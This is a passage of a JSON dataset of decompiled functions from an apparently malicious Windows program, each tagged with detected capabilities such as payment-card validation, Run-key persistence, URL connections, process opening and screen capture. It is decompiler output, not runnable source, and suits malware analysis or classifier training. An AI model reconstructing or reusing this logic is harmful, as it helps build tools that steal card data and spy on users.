sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 424
    },
    "00481cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481cb8(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x481cd1;\n    fcn.004059cc();\n    uStack36 = 0x481d2a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0xc);\n    fcn.00405584();\n    *(iVar1 + 4) = param_2;\n    *(iVar1 + 8) = var_8h;\n    uVar2 = 0;\n    sub.kernel32.dll_CreateThread_1(0, 0, fcn.00481bac, iVar1, 0, &fcn.00481cb8::var_ch);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x481d31);\n    return;\n}\n",
        "token_count": 279
    },
    "00481d54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481d54 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack48 = 0x481d76;\n    fcn.00405fe8();\n    uStack52 = 0x481e74;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x481e2d;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00408550();\n    fcn.004055c8();\n    uVar1 = fcn.004059dc();\n    var_14h = sub.wsock32.dll_inet_addr(uVar1);\n    iVar2 = sub.wsock32.dll_gethostbyaddr(&fcn.00481d54::var_14h, 4, 2);\n    uVar3 = iVar2 == 0;\n    if (!uVar3) {\n        fcn.0040aa98(0x481e8c, var_4h, *0x49838c);\n        fcn.004058e0(0x481e98, 0);\n    }\n    fcn.00405974();\n    if (uVar3) {\n        *0x492244 = 0;\n        *0x492240 = 1;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 445
    },
    "004821f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004821f4(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack36 = 0x482213;\n    fcn.004059cc();\n    puStack36 = 0x48221b;\n    fcn.004059cc();\n    puStack36 = 0x482223;\n    fcn.004059cc();\n    puStack36 = 0x48222b;\n    fcn.004059cc();\n    uStack40 = 0x482321;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uVar1 = 1;\n    uStack52 = 0x4822ed;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00405974();\n    fcn.00405974();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421f88();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack56;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x482328;\n    uStack40 = 0x482318;\n    fcn.00405554();\n    uStack40 = 0x482320;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 457
    },
    "00482a64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create HTTP request",
            "connect to URL"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00482bb1)\n\nvoid __cdecl fcn.00482a64(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1136;\n    uint uStack1132;\n    uchar *puStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uchar *puStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack1096 = &stack0xfffffffc;\n    puStack1084 = 0x482a9e;\n    fcn.00405fe8();\n    uStack1088 = 0x482c2c;\n    uStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    uStack1100 = 0x482bbb;\n    uStack1104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbb0;\n    uStack1108 = 0x482ac9;\n    puStack1084 = &stack0xfffffffc;\n    fcn.00408550();\n    uStack1108 = 0x482ad3;\n    fcn.004055c8();\n    arg_8h_00 = *(arg_8h + 4);\n    uStack1108 = 0x482afb;\n    fcn.00403af4();\n    uStack1108 = 0;\n    uStack1112 = 0;\n    uStack1116 = 0;\n    uStack1120 = 0;\n    uStack1124 = 0x482c3c;\n    puStack1128 = 0x482b0d;\n    uVar1 = sub.wininet.dll_InternetOpenA();\n    uStack1132 = 0x482ba1;\n    uStack1136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb90;\n    puStack1128 = &stack0xfffffffc;\n    uVar2 = fcn.004059dc(0, 0, 0, 0);\n    uVar2 = sub.wininet.dll_InternetOpenUrlA(uVar1, uVar2);\n    sub.wininet.dll_InternetCloseHandle();\n    *in_FS_OFFSET = uVar2;\n    sub.wininet.dll_InternetCloseHandle(uVar1, 0x482ba8);\n    uVar4 = 0x482c50;\n    uVar3 = 0;\n    uVar2 = 0x482c80;\n    uVar1 = 0;\n    fcn.00409e4c(arg_8h_00);\n    fcn.004058e0(0x482c8c, 0, arg_8h_00, uVar1, uVar2, uVar3, uVar4);\n    fcn.00474d1c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 793
    },
    "00482e14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482e14 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x482f49;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b730();\n    if (_var_18h == *0x482f64) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x482f68;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x482f6c;\n    } while (*0x482f64 < _var_18h);\n    fcn.0048b4bc();\n    fcn.00405864();\n    fcn.00474d1c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 428
    },
    "00483604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "open process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00483604(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint hObject;\n    uint var_4h;\n    \n    uStack32 = 0x48361e;\n    puVar1 = fcn.00402f00();\n    *puVar1 = 0x28;\n    uStack36 = 0;\n    uStack40 = 0x1f0fff;\n    puStack44 = 0x483632;\n    uVar2 = sub.kernel32.dll_OpenProcess();\n    uStack48 = 0x483680;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar3 = fcn.004610d4();\n    if (iVar3 == 0) {\n        *param_2 = 0;\n    }\n    else {\n        *param_2 = puVar1[3];\n    }\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x483687;\n    uStack52 = 0x48367f;\n    uStack48 = uVar2;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 338
    },
    "00483c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00483c78(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea0;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint hObject;\n    \n    puStack320 = &stack0xfffffffc;\n    uStack324 = 0x483d86;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    puStack332 = 0x483cb6;\n    uVar1 = fcn.00460c98();\n    uStack336 = 0x483d61;\n    uStack340 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeac;\n    puStack332 = &stack0xfffffffc;\n    iVar2 = fcn.00460cb8();\n    if (iVar2 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00483a60(*in_EAX);\n        in_stack_fffffea0 = 0x483d9c;\n        fcn.004058e0(0x483d9c, 0);\n        while (iVar2 = fcn.00460cd8(),  iVar2 != 0) {\n            fcn.00483a60(*in_EAX);\n            in_stack_fffffea0 = 0x483d9c;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    sub.kernel32.dll_CloseHandle_1(uVar1, 0x483d68);\n    return;\n}\n",
        "token_count": 413
    },
    "004840e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.004840e4(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4840fd;\n    fcn.004059cc();\n    puStack28 = 0x484105;\n    fcn.004059cc();\n    puStack28 = 0x48410d;\n    fcn.004059cc();\n    uStack32 = 0x484195;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00483da0, uVar1, 0, *0x4926e4);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48419c);\n    return;\n}\n",
        "token_count": 310
    },
    "004845b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004845b0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x4845c2;\n    fcn.004059cc();\n    uStack20 = 0x4845f1;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4845f8;\n    uStack20 = 0x4845f0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 170
    },
    "0048571c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __fastcall fcn.0048571c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 4;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x48573d;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_1ch = 0x485745;\n    fcn.004059cc();\n    var_20h = 0x485944;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048571c::var_24h;\n    puStack44 = 0x49a3a4;\n    puStack48 = 0x48575d;\n    var_1ch = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack52 = 0x485922;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack56;\n        puStack48 = 0x48594b;\n        puStack52 = 0x485943;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49a3a0 + 0xc))();\n            puStack44 = &fcn.0048571c::var_ch;\n            puStack48 = 0x4857bb;\n            fcn.00405b28();\n            puStack48 = 0x4857cb;\n            fcn.00405a44();\n            puStack48 = 0x4857d8;\n            fcn.00405b28();\n            puStack48 = 0x4857e7;\n            fcn.00405a84();\n            puStack48 = &fcn.0048571c::var_10h;\n            puStack52 = 0x4857f8;\n            fcn.00405b28();\n            puStack52 = 0x485808;\n            fcn.00405a44();\n            puStack52 = 0x485815;\n            fcn.00405b28();\n            puStack52 = 0x485824;\n            fcn.00405a84();\n            puStack52 = &fcn.0048571c::var_14h;\n            puStack56 = 0x485835;\n            fcn.00405b28();\n            puStack56 = 0x485845;\n            fcn.00405a44();\n            puStack56 = 0x485852;\n            fcn.00405b28();\n            puStack56 = 0x485861;\n            fcn.00405a84();\n            puStack56 = &fcn.0048571c::var_18h;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                fcn.004055c8();\n                fcn.004058e0(var_1ch, 0x48595c, var_18h, 0x48595c, var_14h, 0x48595c, var_10h, 0x48595c, var_ch);\n                (**(**0x49a3a0 + 0x20))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack56;\n    puStack48 = 0x485929;\n    puStack52 = 0x49a3a4;\n    puStack56 = 0x485921;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 1162
    },
    "00485eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485eec(uint arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    puStack44 = 0x485f10;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x485f18;\n    fcn.004059cc();\n    puStack44 = 0x485f20;\n    fcn.004059cc();\n    puStack44 = 0x485f28;\n    fcn.004059cc();\n    uStack48 = 0x486050;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 0x49a3a4;\n    puStack60 = 0x485f40;\n    puStack44 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack64 = 0x486019;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    cVar1 = fcn.00485960();\n    if (cVar1 != '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x486057;\n        uStack64 = 0x48603a;\n        fcn.00405554();\n        uStack64 = 0x486047;\n        fcn.00405554();\n        uStack64 = 0x48604f;\n        fcn.00405530();\n        return;\n    }\n    fcn.004058e0(0x486074, arg_8h, 0x486068, var_ch, 0x486068, var_8h, 0x486068, var_4h);\n    (**(**0x49a3a0 + 0x38))();\n    puVar2 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n    uVar3 = fcn.00409ecc();\n    *puVar2 = uVar3;\n    fcn.00409b6c();\n    fcn.00405584();\n    fcn.00409b6c();\n    fcn.00405584();\n    puVar2[3] = 0;\n    uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00485474, puVar2, 0, &fcn.00485eec::var_14h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar3;\n    sub.kernel32.dll_LeaveCriticalSection(0x49a3a4, 0x486020);\n    return;\n}\n",
        "token_count": 746
    },
    "00486078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00486078(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48608e;\n    fcn.004059cc();\n    uStack20 = 0x4860cf;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864();\n    fcn.00474d1c();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4860d6;\n    uStack20 = 0x4860ce;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 192
    },
    "00487038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487038(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStackY156;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    \n    puStack108 = &stack0xfffffffc;\n    uStack112 = 0x487134;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack116;\n    var_48h = 0x48;\n    iVar1 = sub.user32.dll_GetMonitorInfoA(arg_8h, &var_48h);\n    uVar2 = iVar1 == 0;\n    if (!uVar2) {\n        fcn.004057a0();\n        fcn.00405974();\n        if (uVar2) {\n            *0x49a3c0 = var_44h;\n            *0x49a3c4 = var_40h;\n            fcn.00409d60(0x48714c);\n            fcn.00409d60(0x48715c, 0);\n            fcn.00409d60(0x48715c, 0);\n            fcn.00409d60(0x48715c, 0);\n            uStackY156 = 0;\n            fcn.004058e0();\n            fcn.00474d1c();\n        }\n    }\n    *in_FS_OFFSET = uStackY156;\n    fcn.00405554(0x48713b);\n    return;\n}\n",
        "token_count": 415
    },
    "004873b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004873b8(int32_t param_1, uint param_2)\n\n{\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack100 = 0x4873d5;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack104 = 0x4875a5;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0x4873f1;\n    puStack100 = &stack0xfffffffc;\n    uStack124 = fcn.004059dc();\n    puStack128 = 0x4873f7;\n    hdc = sub.gdi32.dll_CreateDCA();\n    uStack132 = 0x487580;\n    iStack136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff78;\n    puStack128 = &stack0xfffffffc;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n    var_18h = sub.gdi32.dll_SelectObject();\n    sub.gdi32.dll_BitBlt();\n    puStack204 = 0x487472;\n    var_1ch = fcn.0045fa78(unaff_EDI);\n    uStack208 = 0x487541;\n    iStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    puStack204 = &stack0xfffffffc;\n    if (param_1 != 100) {\n        puStack204 = &stack0xfffffffc;\n        fcn.0045fd38(0);\n    }\n    fcn.0045fc54();\n    var_20h = *0x49a3d0;\n    var_40h = 1;\n    var_3ch = **0x49239c;\n    uStack60 = (*0x49239c)[1];\n    uStack56 = (*0x49239c)[2];\n    uStack52 = (*0x49239c)[3];\n    var_28h = **0x492780;\n    var_2ch = 1;\n    var_24h = &fcn.004873b8::var_20h;\n    fcn.00420a60(0);\n    fcn.00407024();\n    arg_8h = &fcn.004873b8::var_40h;\n    fcn.0045f980(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650(0x487548);\n    return;\n}\n",
        "token_count": 819
    },
    "00488188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488188(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x48819e;\n    fcn.004059cc();\n    uStack20 = 0x4881ec;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.0040f224(0);\n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0;\n    sub.user32.dll_MessageBoxA_1(0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x4881f3);\n    return;\n}\n",
        "token_count": 231
    },
    "00488450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00488450(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x488466;\n    fcn.004059cc();\n    uStack20 = 0x4884bd;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x4884dc, 0x4884d4, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x4884c4);\n    return;\n}\n",
        "token_count": 231
    },
    "0048875c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0048875c(void)\n\n{\n    int32_t iVar1;\n    uint32_t auStack8 [2];\n    \n    auStack8[0] = 8;\n    sub.user32.dll_GetLastInputInfo(auStack8);\n    iVar1 = sub.kernel32.dll_GetTickCount_1();\n    return (iVar1 - auStack8[0]) / 1000 | auStack8[0] << 0x20;\n}\n",
        "token_count": 100
    },
    "00488784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488784(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x488798;\n    fcn.004059cc();\n    uStack44 = 0x48884b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x48882b;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x4887c0;\n    puStack40 = &stack0xfffffffc;\n    puVar2 = fcn.00404620();\n    uStack68 = 0x48881a;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 == '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack72;\n        *in_FS_OFFSET = uStack60;\n        puStack52 = 0x488852;\n        uStack56 = 0x48884a;\n        fcn.00405530();\n        return;\n    }\n    fcn.0041be84();\n    (***puVar2)();\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x488821;\n    uStack68 = 0x488819;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 447
    },
    "00488860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488860(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    puStack80 = 0x488875;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack84 = 0x4888ec;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    fcn.00403af4();\n    pExecInfo = 0x3c;\n    var_3ch = 0x500;\n    var_30h = fcn.004059dc();\n    var_34h = 0x4888fc;\n    var_2ch = 0x488904;\n    var_24h = 1;\n    sub.shell32.dll_ShellExecuteExA();\n    *in_FS_OFFSET = &fcn.00488860::pExecInfo;\n    uStack84 = 0x4888f3;\n    iStack88 = 0x4888eb;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 325
    },
    "00488908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
